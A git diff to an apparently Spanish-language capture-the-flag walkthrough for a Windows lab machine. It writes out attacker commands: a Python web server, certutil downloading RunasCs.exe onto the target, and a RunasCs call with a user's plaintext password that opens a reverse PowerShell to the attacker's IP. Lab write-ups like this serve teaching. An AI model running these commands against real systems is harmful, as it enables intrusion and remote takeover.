@@ -430,12 +430,45 @@ Active Connections
   TCP    10.129.185.102:139     0.0.0.0:0              LISTENING       InHost      
   TCP    10.129.185.102:49671   10.10.15.14:443        ESTABLISHED     InHost  
 ```
+Descoprimimos el archivo y configuramos para montar un servicio web para poder descargarlo al servidor IS
 ```bash
+└──╼ #python -m http.server 81
+Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
+
+```
+En el servidor en la carapeta Windows\temp\ creamos una carpeta test descargamos el archivo
+
+```powershell
+PS C:\Windows\temp\test> certutil.exe -f -urlcache -split http://10.10.14.15:81/RunasCs.exe
+****  Online  ****
+CertUtil: -URLCache command FAILED: 0x80072ee4 (WinHttp: 12004 ERROR_WINHTTP_INTERNAL_ERROR)
+CertUtil: An internal error occurred in the Microsoft Windows HTTP Services
+PS C:\Windows\temp\test> certutil.exe -f -urlcache -split http://10.10.15.14:81/RunasCs.exe
+****  Online  ****
+  0000  ...
+  ca00
+CertUtil: -URLCache command completed successfully.
+
+PS C:\Windows\temp\test> ls
+
+    Directory: C:\Windows\temp\test
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        6/27/2024  10:46 AM          51712 RunasCs.exe                                                           
+
+PS C:\Windows\temp\test> 
+
+```
+Ahora cremos una conexion con RunasCs, nos valemos de la guia .\RunasCs.exe --help para crear una revertshell con el usuario alaading no sin antes escuchar el puerto 443 en nuestro atacante
 ```bash
-```bash
-```bash
-```bash
-```bash
+
+```
+En el servidor
+```powershell
+.\RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.15.14:443
+```
+
 ```bash
 ```bash
 ```bash
